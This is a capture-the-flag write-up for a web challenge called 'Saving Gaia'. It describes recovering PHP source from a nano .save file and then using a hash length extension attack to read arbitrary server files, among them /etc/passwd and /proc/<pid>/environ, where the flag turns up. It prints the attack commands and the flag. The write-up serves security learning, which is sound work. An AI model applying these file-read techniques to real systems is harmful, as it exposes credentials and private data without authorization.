# Saving Gaia
Web - 100 points

## Challenge 
> Please save the environment to get the flag!

> http://web.chal.gryphonctf.com:17565

> [Update] 08/10/2017 07:20PM - Hint 1 released

> Creator - @Platy

## Hint 1
> The journal contains the necessary information to find the PHP source code


## Hint 2
> What happens to nano when it receives a SIGHUP or SIGTERM when it is running?


## Solution

Looking around, we eventually get to [the page's robots.txt](http://web.chal.gryphonctf.com:17565/robots.txt). We see there is a file called [my_journal.txt](http://web.chal.gryphonctf.com:17565/my_journal.txt) 

	
	...

	12/9/2017:	Going back to nano editor. I'm too dumb for vi, but I won't tell my senior that.

	15/9/2017:	My laptop battery spoilt and those stingy companies only gave 1 year warranty on that. Someone accidentally tripped over my wire and my screen blacked out. Thanks a lot!

	...

After reading the journal, and as hint 2 suggests, [nano was interrupted while it was in use](https://askubuntu.com/questions/601985/what-are-save-files
). 
> ... if nano receives a SIGHUP or SIGTERM or runs out of memory. It will write the buffer into a file named nano.save if the buffer didn’t have a name already, or will add a ".save" suffix to the current filename

This means there is a file at [view.php.save](http://web.chal.gryphonctf.com:17565/view.php.save)

---

Opening it, we see the PHP source code within the HTML

	<?php
		$SECRET = ""; // To do in the future
		$file = $_POST["file"];
		$mac = $_POST["mac"];
		$magic = $_POST["magic"];
		for( $i = 0; $i <= strlen($file); $i++ ) {
			$num1 += ord($file[$i]);
		}
		for( $i = 0; $i <= strlen($mac); $i++ ) {
			$num2 += ord($mac[$i]);
		}
		$num3 = $num1 * $num2 - $num1 - $num2;
		if ($num3 == $magic) {
			$file = pack("H*",$file);
			$hash = hash("sha1",$SECRET.$file);
			$file = explode(",",$file);
			$file = $file[sizeof($file)-1];
			if ($hash === $mac) {
				// Figure out how to read from files
			} else {
				echo "You are not authorised to view this file!";
			}
		} else {
			echo "You are not authorised to view this file!";
		}
	?>

Let's convert the `$num3 == $magic` portion to a python function. We can see that it calculates a checksum number based on the 2 hex strings.

	python3
	>>> import gaia
	>>> gaia.magic('66696c656c6f636174696f6e2c6c6973742e747874', '48b49f65a86cd617e5c7423d23a67738c4057d06')
	6895875


Next, we realise `file` variable is in hex-encoded.
So we can change `list.txt` to another file.

	python
	>>> '66696c656c6f636174696f6e2c6c6973742e747874'.decode('hex')
	'filelocation,list.txt'


But we realise there is a [hash authentication (HMAC)](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code). 
In the PHP source, are given the `$file` portion and the `$hash` of `$SECRET.$file` but no `$SECRET`
	
	$hash = hash("sha1",$SECRET.$file);


This reminds me of a [length extension attack I used in CrossCTF 2017](https://github.com/zst123/crossctf_quals-2017-writeups/tree/master/Salted_Hash_Challenge).

	$file = explode(",",$file);
	$file = $file[sizeof($file)-1];

From this portion, it takes the last comma delimited value as the filename.
We just need to apply an extension of `,new_filename`

However, we do not know the key length, so we have to bruteforce it. 
Alright, run the bruteforce!

	$ pip3 install hashpumpy
	$ python3 gaia.py

After reaching key length of `86`, we get a valid response from the website!
One thing to note is that length extension attack requires the padding which is returned by the hashpump function.

Now we have a working file viewer script!
We can read a few files, such as `/etc/passwd`, and `.htaccess` and many misc files. But I can't seem to find the flag!

	python3 -c 'from gaia import *; print(attempt(86, ",.htaccess"))'

	python3 -c 'from gaia import *; print(attempt(86, ",/etc/passwd"))'

	python3 -c 'from gaia import *; print(attempt(86, ",/usr/include/error.h"))'

---

I spent hours manually transversing through the directory to no avail. I asked the challenge creator for hints and they mentioned looking for "files" which store "environment variables". Alright, looks like I must save the "environment" indeed!

I ruled the following out after it didn't work

	python3 -c 'from gaia import *; print(attempt(86, ",/etc/environment"))'
	python3 -c 'from gaia import *; print(attempt(86, ",.env"))'
	python3 -c 'from gaia import *; print(attempt(86, ",.environment"))'
	python3 -c 'from gaia import *; print(attempt(86, ",.dockerenv"))'


Feeling lost, I tried to search for `env` files on my own Ubuntu machine (which is the common shorthand for environment).

	$ find . -name '*env*'
	...
	
	./etc/environment
	./lib/x86_64-linux-gnu/security/pam_env.so
	./proc/1/task/1/environ
	./proc/1/environ
	./proc/281/task/281/environ
	./proc/281/environ
	./proc/333/task/333/environ
	./proc/333/environ
	./proc/350/task/350/environ
	
	...

Seems logical... [Environment variables which are stored in memory can be accessed at `/proc/pid/environ`](https://stackoverflow.com/a/532284). The key word hinted by the creator is "variables" which are created at runtime.

---

I decided to bruteforce the `pid` in `/proc/{pid}/environ`.
Eventually, the flag is found at `,/proc/6594/environ`!

	$ python3 bruteforce_env.py
	...
		<h2>Here are our proud supporters!</h2>
		<article>
			APACHE_PID_FILE=/var/run/apache2/apache2.pidHOSTNAME=d9fbb360e3bdAPACHE_RUN_USER=www-dataPHP_INI_DIR=/usr/local/etc/phpPHP_ASC_URL=https://secure.php.net/get/php-7.0.24.tar.xz.asc/from/this/mirrorPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2PHP_MD5=PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		libpcre3-dev 		make 		pkg-config 		re2cPHP_URL=https://secure.php.net/get/php-7.0.24.tar.xz/from/this/mirrorAPACHE_ENVVARS=/etc/apache2/envvarsPHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pieAPACHE_LOG_DIR=/var/log/apache2PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2GPG_KEYS=1A4E8B7277C42E53DBA9C7B9BCAA30EA9C0D5763 6E4F6AB321FDC07F2C332E3AC2BF0BC433CFC8B3PWD=/var/www/htmlLANG=CAPACHE_RUN_GROUP=www-dataSHLVL=0PHP_SHA256=4dba7aa365193c9229f89f1975fad4c01135d29922a338ffb4a27e840d6f1c98APACHE_CONFDIR=/etc/apache2PHP_EXTRA_BUILD_DEPS=apache2-devAPACHE_LOCK_DIR=/var/lock/apache2APACHE_RUN_DIR=/var/run/apache2PHP_VERSION=7.0.24PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2Flag=GCTF{6l0b4l_w4rm1n6_15_r34lz}			</article>

## Flag
`GCTF{6l0b4l_w4rm1n6_15_r34lz}`